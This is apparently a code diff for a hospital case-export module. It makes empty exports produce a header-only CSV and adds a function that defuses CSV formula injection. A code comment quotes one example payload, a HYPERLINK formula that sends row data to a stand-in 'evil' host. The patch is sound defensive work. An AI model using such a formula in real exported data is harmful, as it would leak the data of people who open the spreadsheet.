@@ -259,7 +259,11 @@ export function toHospitalExportRows(casesData: Case[]): ExportRow[] {
 
 /** Deterministic column order: fixed core + sorted dynamic headers (form labels). */
 export function hospitalExportColumnOrder(rows: ExportRow[]): string[] {
-  if (rows.length === 0) return [];
+  // Always emit core headers so the CSV is a valid (header-only) file
+  // even when no rows match. The previous behavior returned [], which
+  // produced a completely empty download and made empty filters look
+  // like a server failure to end users.
+  if (rows.length === 0) return [...CORE_CASE_SNAKE_ORDER];
   const coreSet = new Set<string>(CORE_CASE_SNAKE_ORDER);
   const dynamicKeys = Object.keys(rows[0])
     .filter((k) => !coreSet.has(k))
@@ -290,8 +294,30 @@ export function buildExportCsvFilename(options: {
   return `${options.scope}-export${layout}_${sanitizeDate(options.dateFrom)}_to_${sanitizeDate(options.dateTo)}.csv`;
 }
 
+/**
+ * Defuse CSV formula injection (Excel / Sheets / Numbers).
+ *
+ * Any cell that *starts* with `=`, `+`, `-`, `@`, `\t`, or `\r` is parsed
+ * as a formula by Excel — even inside quoted fields. A malicious owner
+ * name like `=HYPERLINK("http://evil/?c="&A1, "Click me")` would silently
+ * exfiltrate the row on open. Prefixing with a single apostrophe (`'`)
+ * forces Excel to treat the cell as a literal string. Apostrophes get
+ * stripped by Excel on display, so the visible value is unchanged.
+ *
+ * See OWASP "CSV Injection" cheat sheet.
+ */
+export function defuseSpreadsheetFormula(value: string): string {
+  if (!value) return value;
+  const first = value.charAt(0);
+  if (first === "=" || first === "+" || first === "-" || first === "@" || first === "\t" || first === "\r") {
+    return `'${value}`;
+  }
+  return value;
+}
+
 function escapeCsvCell(value: string): string {
-  const val = value.replace(/"/g, '""');
+  const safe = defuseSpreadsheetFormula(value);
+  const val = safe.replace(/"/g, '""');
   return `"${val}"`;
 }
 
@@ -299,7 +325,17 @@ function escapeCsvCell(value: string): string {
  * RFC-style CSV: UTF-8 BOM (Excel-friendly), CRLF newlines, quoted fields, stable column order.
  */
 export function rowsToCsv(rows: ExportRow[], columnOrder?: readonly string[]): string {
-  if (rows.length === 0) return "No data";
+  // Zero rows: emit a header-only CSV when we know the column order, so the
+  // download is a valid spreadsheet that the user can open and inspect.
+  // Falls back to the legacy "No data" placeholder only when we have no
+  // schema to render (caller didn't pass `columnOrder`).
+  if (rows.length === 0) {
+    if (!columnOrder || columnOrder.length === 0) return "No data";
+    const headerLine = columnOrder
+      .map((c) => `"${String(c).replace(/"/g, '""')}"`)
+      .join(",");
+    return "\uFEFF" + headerLine + "\r\n";
+  }
 
   const headers =
     columnOrder && columnOrder.length > 0
